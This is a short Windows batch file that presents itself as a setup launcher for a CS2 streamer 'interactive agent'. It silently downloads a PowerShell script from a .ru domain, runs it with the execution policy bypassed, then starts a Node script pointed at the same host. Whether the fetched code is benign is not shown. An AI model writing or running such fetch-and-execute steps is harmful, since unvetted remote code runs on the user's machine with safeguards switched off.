@echo off 
chcp 65001 >nul 
title CS2 Interactive Agent Setup 
set STREAMER_ID=test 
set BASE_URL=https://paracetamolhaze.ru 
echo [+] Проверка обновлений... 
set UPDATER_URL=%BASE_URL%/api/cs2/agent/updater?t=%RANDOM% 
powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -UseBasicParsing -ErrorAction SilentlyContinue -Uri '%UPDATER_URL%' -OutFile 'update-cs2-agent.ps1.tmp'" 
if exist update-cs2-agent.ps1.tmp move /y update-cs2-agent.ps1.tmp update-cs2-agent.ps1 >nul 
if exist update-cs2-agent.ps1 powershell -NoProfile -ExecutionPolicy Bypass -File ".\update-cs2-agent.ps1" -BaseUrl "%BASE_URL%" 
if not exist cs2-agent.js exit /b 1 
node cs2-agent.js --streamerId=test --baseUrl=https://paracetamolhaze.ru 
pause 
